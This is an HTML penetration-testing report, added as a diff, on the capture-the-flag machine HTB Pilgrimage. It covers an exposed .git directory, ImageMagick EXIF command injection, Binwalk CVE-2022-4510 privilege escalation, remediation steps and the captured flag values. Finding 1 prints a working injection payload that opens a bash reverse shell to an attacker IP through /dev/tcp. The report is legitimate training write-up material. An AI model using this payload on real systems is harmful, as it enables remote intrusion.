@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Pilgrimage</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: Pilgrimage</h2>
+        <h3 class="report-meta">Date: 09 May 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+        
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#evidence">Evidence Files</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>This report documents the findings from a penetration test on the HTB Pilgrimage machine (10.10.11.219). The assessment revealed a chain of high-risk vulnerabilities that allowed for a full system compromise. The attack path initiated with the discovery of an exposed `.git` repository, which led to source code review and the identification of a Remote Code Execution (RCE) vulnerability in the site's image processing functionality. After gaining a user shell, privilege escalation to root was achieved by exploiting a known RCE vulnerability in Binwalk (CVE-2022-4510), which was being executed by a privileged cron job.</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>2 high-risk vulnerabilities</strong> were chained to achieve root access.</li>
+            <li><strong>Complete system compromise</strong> from unauthenticated access to root.</li>
+            <li><strong>Information Disclosure</strong> via an exposed `.git` repository.</li>
+            <li><strong>Remote Code Execution</strong> through improper handling of EXIF data by ImageMagick.</li>
+            <li><strong>Privilege Escalation</strong> via Binwalk RCE (CVE-2022-4510) triggered by a cron job.</li>
+        </ul>
+
+        <h3>Risk Level: HIGH</h3>
+        <p>The system is exposed to a high risk of compromise. The combination of insecure development practices (exposed repository, vulnerable code) and the use of outdated, vulnerable system utilities provides a clear path for an unauthenticated attacker to gain full administrative control.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.11.219</li>
+            <li><strong>Operating System:</strong> Debian Linux</li>
+            <li><strong>Hostname:</strong> pilgrimage.htb</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access:</strong> An exposed `.git` directory was discovered in the web root. The repository was downloaded, and source code analysis of `index.php` revealed that the application used ImageMagick to process uploaded images. A vulnerability was identified where user-supplied data from a POST parameter (`convert`) was passed unsanitized to an EXIF property, allowing for command injection. A malicious payload was used to gain a reverse shell as the `emily` user.</li>
+            <li><strong>Privilege Escalation:</strong> Internal enumeration revealed a cron job running as the root user that executed the `malwarescan.sh` script. This script used a vulnerable version of `binwalk` to scan files in a directory writable by the `emily` user (`/var/www/pilgrimage.htb/shrunk/`). An exploit for CVE-2022-4510 was used to craft a malicious PNG file. This file, when scanned by the cron job, triggered the vulnerability and executed a reverse shell payload, granting root access.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: Remote Code Execution via ImageMagick EXIF Injection</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 8.8<br>
+        <strong>CWE:</strong> CWE-78 (OS Command Injection)</p>
+        <p><strong>Description:</strong><br>
+        The web application for shrinking images is vulnerable to RCE due to two chained issues. First, an exposed `.git` directory allows an attacker to download the application's source code. Review of `index.php` shows that the application uses the ImageMagick library and sets an EXIF property from user input: `$image->setImageProperty('Exif:Image.Make', $_POST['convert']);`. ImageMagick has a known vulnerability where a pipe character (`|`) in certain properties can lead to command execution. By providing a malicious command as the value for the `convert` POST parameter during file upload, an attacker can execute arbitrary commands on the server.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Parameter:</strong> `convert` in the file upload POST request.</li>
+            <li><strong>Vulnerable Library:</strong> ImageMagick</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following payload was used in the `convert` parameter to gain a reverse shell:</p>
+        <pre><code>|/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'</code></pre>
+        <p><strong>Impact:</strong> This vulnerability allows an unauthenticated, remote attacker to gain a shell on the system with the privileges of the web server user (`emily`), providing the initial foothold.</p>
+
+        <h3>Finding 2: Privilege Escalation via Binwalk RCE (CVE-2022-4510)</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.8<br>
+        <strong>CWE:</strong> CWE-434 (Unrestricted Upload of File with Dangerous Type)</p>
+        <p><strong>Description:</strong><br>
+        A cron job running as the root user periodically executes the `/usr/bin/malwarescan.sh` script. This script scans all files in `/var/www/pilgrimage.htb/shrunk/` using the `binwalk` utility. The installed version of Binwalk is vulnerable to CVE-2022-4510, an RCE vulnerability triggered by scanning a specially crafted file. Since the `emily` user (compromised in Finding 1) has write permissions to the scanned directory, an attacker can place a malicious file there. When the cron job runs, `binwalk` executes as root, triggering the payload and providing a root shell.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Component:</strong> `binwalk` (version < 2.3.3)</li>
+            <li><strong>Trigger:</strong> A root-owned cron job scanning a user-writable directory.</li>
+        </ul>
+        <p><strong>Impact:</strong> This vulnerability provides a reliable method for a low-privileged user to escalate their privileges to root, leading to a complete compromise of the system.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance</h3>
+        <ul>
+            <li><strong>Scanning:</strong> Identified SSH on port 22 and an HTTP service on port 80.</li>
+            <li><strong>Information Disclosure:</strong> Discovered and downloaded the contents of an exposed `.git` directory from the web root.</li>
+        </ul>
+
+        <h3>Phase 2: Initial Access</h3>
+        <ul>
+            <li><strong>Source Code Review:</strong> Analyzed the downloaded PHP code and identified the ImageMagick vulnerability vector.</li>
+            <li><strong>RCE Exploitation:</strong> Uploaded an image with a crafted `convert` parameter containing a reverse shell payload.</li>
+            <li><strong>Foothold Gained:</strong> Received a shell as the `emily` user and captured the user flag.</li>
+        </ul>
+        
+        <h3>Phase 3: Privilege Escalation</h3>
+        <ul>
+            <li><strong>Internal Enumeration:</strong> Discovered the `malwarescan.sh` script and the associated root-owned cron job.</li>
+            <li><strong>Vulnerability Identification:</strong> Identified that the `binwalk` version in use was vulnerable to CVE-2022-4510.</li>
+            <li><strong>Exploit Crafting:</strong> Used a public exploit to create a malicious PNG file containing a root reverse shell payload.</li>
+            <li><strong>Root Access:</strong> Placed the malicious file in the scanned directory, waited for the cron job to trigger, and received a root shell.</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <h3>TCP Port Scan</h3>
+        <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
+80/tcp open  http    nginx 1.18.0</code></pre>
+
+        <hr>
+        
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Remove Exposed `.git` Directory:</strong> The `.git` directory must be removed from the web server's document root immediately. Configure the web server to explicitly deny access to hidden directories and files.</li>
+            <li><strong>Sanitize User Input:</strong> The `convert` POST parameter must be strictly validated and sanitized before being passed to ImageMagick. User-supplied input should never be trusted or used directly in backend processing.</li>
+            <li><strong>Patch Vulnerable Software:</strong> Immediately update the `binwalk` utility to the latest patched version (2.3.3 or later) to mitigate CVE-2022-4510.</li>
+            <li><strong>Review Privileged Scripts:</strong> Re-evaluate the logic of the `malwarescan.sh` script. Running a scanner as root on a directory writable by a low-privileged user is inherently dangerous. The script should run as a non-privileged user or the target directory's permissions should be hardened.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/emily/user.txt</li>
+            <li><strong>Value:</strong> 5dd96e0ab9294432729a98437325b20e</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> 9478d8b1378ba20cfdc13c20c4a4b40e</li>
+        </ul>
+
+        <h3>Key Artifacts</h3>
+        <ul>
+            <li><strong>ImageMagick Payload:</strong> `|/bin/bash -c '...'`</li>
+            <li><strong>Privilege Escalation CVE:</strong> CVE-2022-4510</li>
+            <li><strong>Trigger for PrivEsc:</strong> `malwarescan.sh` cron job</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The Pilgrimage machine was compromised through a chain of high-risk vulnerabilities stemming from insecure development practices and a failure to maintain system software. The initial exposure of a `.git` repository provided the blueprint for the first exploit—an RCE in the application logic. The subsequent privilege escalation took advantage of an outdated, vulnerable utility being run by a privileged automated task. This engagement highlights that security must be considered at all stages of the lifecycle, from development (preventing code leaks and writing secure code) to system administration (patch management and privilege separation).</p>
+        
+        <p><strong>Business Risk:</strong> HIGH - An exposed version control repository on a public server led to a full system compromise. This indicates a significant breakdown in development and deployment security, placing any data on the system and the system itself at high risk of unauthorized access and manipulation.</p>
+        <p><strong>Technical Risk:</strong> The combination of an RCE in the web application and a privilege escalation vulnerability in a system utility creates a reliable and severe risk, allowing a full takeover of the server by an unauthenticated attacker.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> 09 May 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
